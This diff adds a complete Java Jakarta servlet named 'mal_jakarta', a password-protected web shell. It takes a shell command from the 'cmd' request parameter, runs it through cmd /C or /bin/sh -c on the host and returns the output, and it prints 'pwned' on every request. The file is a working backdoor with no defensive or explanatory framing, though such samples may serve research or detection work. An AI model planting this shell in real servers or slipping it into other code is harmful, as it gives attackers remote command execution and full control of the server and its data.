@@ -1,0 +1,55 @@
+import java.io.IOException;
+import java.io.PrintWriter;
+import java.time.LocalDateTime;
+
+import jakarta.servlet.ServletException;
+import jakarta.servlet.annotation.WebServlet;
+import jakarta.servlet.http.HttpServlet;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
+
+import java.io.*;
+
+@WebServlet(urlPatterns = {"/mal_jakarta"})
+public class mal_jakarta extends HttpServlet {
+        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+                String pass = "<<PASSWORD>>";
+
+                String cmd;
+                String[] cmdary;
+                String OS = System.getProperty("os.name");
+
+                PrintWriter pw =  response.getWriter();
+                pw.println("pwned");
+
+                if (request.getParameter("pass") != null) {
+                        if ((request.getParameter("pass")).equals(pass)) {
+                                if (request.getParameter("cmd") != null) {
+                                        cmd = new String (request.getParameter("cmd"));
+
+                                        if (OS.startsWith("Windows")) {
+                                                cmdary = new String [] {"cmd", "/C", cmd};
+                                        }
+                                        else {
+                                                cmdary = new String [] {"/bin/sh", "-c", cmd};
+                                        }
+                                        Process p = Runtime.getRuntime().exec(cmdary);
+                                        OutputStream os = p.getOutputStream();
+                                        InputStream in = p.getInputStream();
+                                        DataInputStream dis = new DataInputStream(in);
+                                        String disr = dis.readLine();
+                                        while ( disr != null ) {
+                                                pw.print(disr);
+                                                disr = dis.readLine();
+                                        }
+                                        pw.println("");
+                                }
+                        }
+                }
+        }
+
+        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+                PrintWriter pw =  response.getWriter();
+                pw.println("pwned_post");
+        }
+}
